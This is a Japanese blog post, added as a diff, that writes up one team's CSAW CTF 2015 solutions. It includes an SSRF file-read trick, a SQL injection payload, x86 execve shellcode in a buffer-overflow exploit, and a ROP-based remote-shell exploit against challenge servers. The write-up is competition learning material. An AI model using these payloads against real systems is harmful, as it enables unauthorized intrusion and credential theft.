@@ -55,6 +55,90 @@
     <header>
       
         <div class="icon"></div>
+        <time datetime="2015-09-23T07:46:16.000Z"><a href="/blog/2015/09/23/csaw-ctf-2015-writeup/">Sep 23 2015</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/blog/2015/09/23/csaw-ctf-2015-writeup/">CSAW CTF 2015 writeup (@_193s)</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p><a href="https://ctftime.org/event/227" target="_blank" rel="external">CSAW CTF Qualification Round 2015</a>にvulscryptosとして参加しました．<br>31/35問を解いて5860pt 14位(日本勢1位)でした👏</p>
+<p><img src="http://i.imgur.com/cKbgFVd.png" width="500px"><br><img src="http://i.imgur.com/1XjyBix.png" width="500px"></p>
+<h3 id="チームメンバーのwriteup:">チームメンバーのwriteup:</h3>
+<p>CSAW CTF 2015 writeup - しゃろの日記 <a href="http://charo-it.hatenablog.jp/entry/2015/09/23/144438" target="_blank" rel="external">http://charo-it.hatenablog.jp/entry/2015/09/23/144438</a></p>
+<h2 id="write-ups">write-ups</h2>
+<p>僕がsubmitしたflagはweb200+web500+web600+exp100+exp400+crypto50+crypto50+crypto50+rev300+for100で，比較的面白かった問題のwriteupをいくつか置いておきます．</p>
+<h3 id="notesy_(crypto_100)">notesy (crypto 100)</h3>
+<p>flagをencryptしてくれるサービス．見るからに単一換字なのだが，encryptされたflagが見つからない．<br>pythonでデコーダを書いてチームのdocsに置いておいたら誰かが解いてくれた．</p>
+<figure class="highlight python="><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</div><div class="line"></div><div class="line">enc_table = <span class="string">'UNHMAQWZIDYPRCJKBGVSLOETXF'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(s)</span>:</span></div><div class="line">  <span class="keyword">print</span> <span class="string">'enc:'</span>, s</div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">dec_char</span><span class="params">(c)</span>:</span></div><div class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> enc_table:</div><div class="line">      offset = enc_table.find(c)</div><div class="line">      <span class="keyword">return</span> chr(ord(<span class="string">'a'</span>)+offset)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">      <span class="keyword">return</span> c</div><div class="line"></div><div class="line">  <span class="keyword">return</span> <span class="string">''</span>.join([dec_char(c) <span class="keyword">for</span> c <span class="keyword">in</span> s])</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> decrypt(argv[<span class="number">1</span>].upper())</div></pre></td></tr></table></figure>
+
+<p><code>UNHMAQWZIDYPRCJKBGVSLOETXF</code>がflagだったらしい．クソ</p>
+<h3 id="Weebdate_(Web_500)">Weebdate (Web 500)</h3>
+<p>適当なアカウントでログインして遊んでいると，edit profileのところでプロフィール画像のURLに対してurllibでアクセスしているっぽいことがわかる．<br><code>file://localhost:/etc/passwd</code>のようなURLを入れることで任意のファイルが読めることに\@a_r_g_v氏が気付き，数分後にサーバー側で動いているコード(<code>/var/www/weeb/server.py</code>，<code>utils.py</code>, <code>settings.py</code>)を取得した．<br>ログインしたいアカウントのidは<code>donaldtrump</code>で<br>あることがわかっていたので，これでコードの通りにsessionを生成するとdonaldtrumpのアカウントでログインできた．<br>が，この時点でまだweb500のsolvesは0であり，プロフィールや他のアカウントとのメッセージのやり取りを見てもflagが見つからない．IRCでコンタクトを取ろうとしても作問者が寝ているので待ってとのこと（クソ）だったのでしばらく待っていると，数時間後に次のhintが公開された．<br>Flag is <code>md5($totpkey.$password)</code></p>
+<p>どうやらdonaldのアカウントでログインするだけでは不十分で，平文のパスワードとtotpkeyを取得する必要があるらしい．totpkeyは容易に求まるが，パスワードに関しては見た感じSQL injectionの脆弱性もないし，そもそもデータベースに格納されているのは<code>sha256(username+password)</code>だし……</p>
+<p>しばらく<code>server.py</code>を眺めていると，<code>get_csp_report</code>にSQLiの脆弱性があることに気付いた．</p>
+<figure class="highlight python="><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_csp_report</span><span class="params">(report_id)</span>:</span></div><div class="line">  cursor = mysql.connection.cursor()</div><div class="line">  cursor.execute( <span class="string">'select * from reports where report_id = %s'</span>% (report_id,) )</div><div class="line">  <span class="keyword">return</span> FetchOneAssoc(cursor)</div></pre></td></tr></table></figure>
+
+<p>ここだけcursorのplaceholderではなく%を使ってformatされていた．本来ならここは%ではなく,が入るべきだった（1文字違い）．わかりにくいバグだ……</p>
+<p>というわけでcsp_reportの方で<br><code>1 and 1=2 union select 1, user_password from users where user_name=&#39;donaldtrump&#39;;--</code><br>のようなクエリを投げるとdonaldのuser_passwordが抜けた．<br>あとは</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">sha256</span>(<span class="string">'donaldtrump'</span>+password) = <span class="number">22</span>e59a7a2792b25684a43d5f5229b2b5caf7abf8fa9f186249f35cae53387fa3</div></pre></td></tr></table></figure>
+
+<p>となるようなpasswordを求めるだけ．<br>適当に総当たりをするコードを書いて動かしていたら<code>zebra</code>が見つかった．</p>
+<p>totpkey: <code>6OIMTPLHSQ6JUKYP</code><br>password: <code>zebra</code><br><code>$ echo -n &#39;6OIMTPLHSQ6JUKYPzebra&#39; | md5sum</code></p>
+<p>flag: <code>a8815ecd3c2b6d8e2e884e5eb6916900</code></p>
+<h2 id="precision_(Exp_100)">precision (Exp 100)</h2>
+<p>canaryっぽいのが実装されている．運営のミスで問題ファイルが2回ぐらい変わってキレた．</p>
+<figure class="highlight python="><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="special">#</span>!/usr/bin/env python</div><div class="line">from ebil import * <span class="special">#</span> &lt;- https://github.com/193s/ebil</div><div class="line"></div><div class="line">exec ebil('./precision_a8f6f0590c177948fe06c76a1831e650', remote=('54.173.98.115', 1259))</div><div class="line">r.recvuntil('Buff: ')</div><div class="line">addr_buf = int(r.recvline(), 16)</div><div class="line"></div><div class="line">log.success('addr_buf = ' + hex(addr_buf))</div><div class="line">patt = '<span class="command">\xA</span>5<span class="command">\x</span>31<span class="command">\x</span>5A<span class="command">\x</span>47<span class="command">\x</span>55<span class="command">\x</span>15<span class="command">\x</span>50<span class="command">\x</span>40'</div><div class="line"></div><div class="line">payload = '<span class="command">\x</span>31<span class="command">\xd</span>2<span class="command">\x</span>52<span class="command">\x</span>68<span class="command">\x</span>2f<span class="command">\x</span>2f<span class="command">\x</span>73<span class="command">\x</span>68<span class="command">\x</span>68<span class="command">\x</span>2f<span class="command">\x</span>62<span class="command">\x</span>69<span class="command">\x</span>6e<span class="command">\x</span>89<span class="command">\xe</span>3<span class="command">\x</span>52<span class="command">\x</span>53<span class="command">\x</span>89<span class="command">\xe</span>1<span class="command">\x</span>33<span class="command">\xc</span>0<span class="command">\x</span>40<span class="command">\x</span>40<span class="command">\x</span>40<span class="command">\x</span>40<span class="command">\x</span>40<span class="command">\x</span>40<span class="command">\x</span>40<span class="command">\x</span>40<span class="command">\x</span>40<span class="command">\x</span>40<span class="command">\x</span>40<span class="command">\xcd</span><span class="command">\x</span>80'.ljust(56, '<span class="command">\x</span>90')</div><div class="line"></div><div class="line">payload += (patt*10)</div><div class="line">payload += p(addr_buf)*100</div><div class="line"></div><div class="line">sendline(payload)</div><div class="line">interact()</div></pre></td></tr></table></figure>
+
+<p>flag: <code>flag{1_533_y0u_kn0w_y0ur_w4y_4r0und_4_buff3r}</code></p>
+<h2 id="FTP_(Rev_300)">FTP (Rev 300)</h2>
+<p>認証部分のコードを読んでいると，<br>username: <code>blankwall</code>で独自のhash値が0xD386D209になるパスワード送れば良いことがわかる．<br>hash値の計算部分を見てみると</p>
+<figure class="highlight c="><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> myhash(<span class="keyword">const</span> <span class="keyword">char</span> *x) {</div><div class="line">  <span class="keyword">int</span> ret = <span class="number">5381</span>;</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; x[i]; ++i ) ret = <span class="number">33</span> * ret + x[i];</div><div class="line">  <span class="keyword">return</span> ret;</div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>このような感じになっていて，2週間前のMMACTFの問題(Simple Hash)と同じなことがわかる(Mod=4294967296)．<br><a href="http://charo-it.hatenablog.jp/entry/2015/09/08/005012" target="_blank" rel="external">http://charo-it.hatenablog.jp/entry/2015/09/08/005012</a> にあるしゃろプロのソルバのパラメータを書き換えて動かしたらpasswordが求まった．<br>password: <code>UJD737</code></p>
+<p><img src="http://i.imgur.com/j6Rl44O.png" width="300"></p>
+<p>というわけでpasswordの時だけ^Dで入力を切るとログインできた．<br><code>RDF</code>を叩いてflag．</p>
+<p>flag: <code>flag{n0_c0ok1e_ju$t_a_f1ag_f0r_you}</code></p>
+<h3 id="memeshop_(Exp_400)">memeshop (Exp 400)</h3>
+<p>解法はしゃろプロのwriteupに詳しく書いてあるのでそちらを参照してください．</p>
+<p>一応exploitだけ: </p>
+<figure class="highlight python="><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">from</span> ebil <span class="keyword">import</span> * <span class="comment"># &lt;- https://github.com/193s/ebil</span></div><div class="line"></div><div class="line"><span class="keyword">exec</span> ebil(<span class="string">'./memeshop.rb'</span>, remote=(<span class="string">'52.3.190.202'</span>, <span class="number">1337</span>), arch=<span class="string">'x86_64'</span>)</div><div class="line"><span class="keyword">if</span> LOCAL:  libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class="line"><span class="keyword">if</span> REMOTE: libc = ELF(<span class="string">'libc-2.19.so'</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_shell_payload</span><span class="params">()</span>:</span></div><div class="line">  <span class="keyword">if</span> LOCAL:  one_gad_rce = libruby_base + <span class="number">0x115a80</span></div><div class="line">  <span class="keyword">if</span> REMOTE: one_gad_rce = libruby_base + <span class="number">0x1129f0</span></div><div class="line">  payload = (chain([</div><div class="line">    one_gad_rce,</div><div class="line">  ]) * <span class="number">1000</span>)[:<span class="number">264</span>]</div><div class="line"></div><div class="line">  <span class="keyword">return</span> payload</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_meme</span><span class="params">()</span>:</span></div><div class="line">  r.sendline(<span class="string">'n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_skeletal</span><span class="params">(payload)</span>:</span></div><div class="line">  r.sendline(<span class="string">'m'</span>)</div><div class="line">  r.sendline(payload.encode(<span class="string">'base64'</span>).strip())</div><div class="line"></div><div class="line"><span class="comment">###############################################################</span></div><div class="line"></div><div class="line">sendline(<span class="string">'p'</span>)</div><div class="line">r.recvuntil(<span class="string">'number bro: '</span>)</div><div class="line"></div><div class="line">filename = <span class="string">'/proc/self/maps'</span></div><div class="line">sendline(filename.encode(<span class="string">'base64'</span>).strip())</div><div class="line"></div><div class="line">map_data = r.recvuntil(<span class="string">'[vsyscall]'</span>).split(<span class="string">'\n'</span>)</div><div class="line">libruby_target_line = filter(<span class="keyword">lambda</span> x: <span class="string">'libruby'</span> <span class="keyword">in</span> x, map_data)[<span class="number">0</span>]</div><div class="line">libruby_base = int(libruby_target_line.split(<span class="string">'-'</span>)[<span class="number">0</span>], <span class="number">16</span>)</div><div class="line"></div><div class="line">log.success(<span class="string">'libruby_base = '</span> + hex(libruby_base))</div><div class="line"></div><div class="line">r.recv()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">256</span>):</div><div class="line">  add_meme()</div><div class="line"></div><div class="line">add_skeletal(gen_shell_payload())</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">'*******************************************************'</span></div><div class="line">sendline(<span class="string">'c'</span>)</div><div class="line">interact()</div></pre></td></tr></table></figure>
+
+<p>flag: <code>flag{dwn: please tell us your meme. I&#39;m not going to stop asking}</code></p>
+<h2 id="最後に">最後に</h2>
+<p>今回は某社の会議室をお借りして会場6~10人+リモート5人ぐらいで取り組んでいました．<br>ピザ美味しかったです :)</p>
+<p><blockquote class="twitter-tweet" lang="ja"><p lang="ja" dir="ltr">会場の様子です <a href="http://t.co/I5T0oM5zmi" target="_blank" rel="external">pic.twitter.com/I5T0oM5zmi</a></p>&mdash; Ikumi Shimizu (@_193s) <a href="https://twitter.com/_193s/status/644990681644052480" target="_blank" rel="external">2015, 9月 18</a></blockquote></p>
+<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+<p><blockquote class="twitter-tweet" lang="ja"><p lang="no" dir="ltr">flag <a href="http://t.co/KOZ8meRWk5" target="_blank" rel="external">pic.twitter.com/KOZ8meRWk5</a></p>&mdash; Ikumi Shimizu (@_193s) <a href="https://twitter.com/_193s/status/645566761375367168" target="_blank" rel="external">2015, 9月 20</a></blockquote></p>
+<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+
+
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+  
+    <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
         <time datetime="2015-09-08T14:10:04.000Z"><a href="/blog/2015/09/08/MMACTF2015-writeup/">Sep 8 2015</a></time>
       
       
@@ -149,7 +233,7 @@
   <h3 class="title">Tags</h3>
   <ul class="entry">
   
-    <li><a href="/blog/tags/CTF/">CTF</a><small>3</small></li>
+    <li><a href="/blog/tags/CTF/">CTF</a><small>4</small></li>
   
     <li><a href="/blog/tags/test/">test</a><small>1</small></li>
   
@@ -161,6 +245,10 @@
 <div class="widget tag">
   <h3 class="title">Recent Posts</h3>
   <ul class="entry">
+    
+      <li>
+        <a href="/blog/2015/09/23/csaw-ctf-2015-writeup/">CSAW CTF 2015 writeup (@_193s)</a>
+      </li>
     
       <li>
         <a href="/blog/2015/09/08/MMACTF2015-writeup/">MMA CTF 1st 2015に出た話 (@_193s)</a>
@@ -176,10 +264,6 @@
     
       <li>
         <a href="/blog/2015/02/11/seccon-2014-finals/">SECCON CTF 2014本戦に参加した</a>
-      </li>
-    
-      <li>
-        <a href="/blog/2015/01/05/Hello-World/">Hello World</a>
       </li>
     
   </ul>
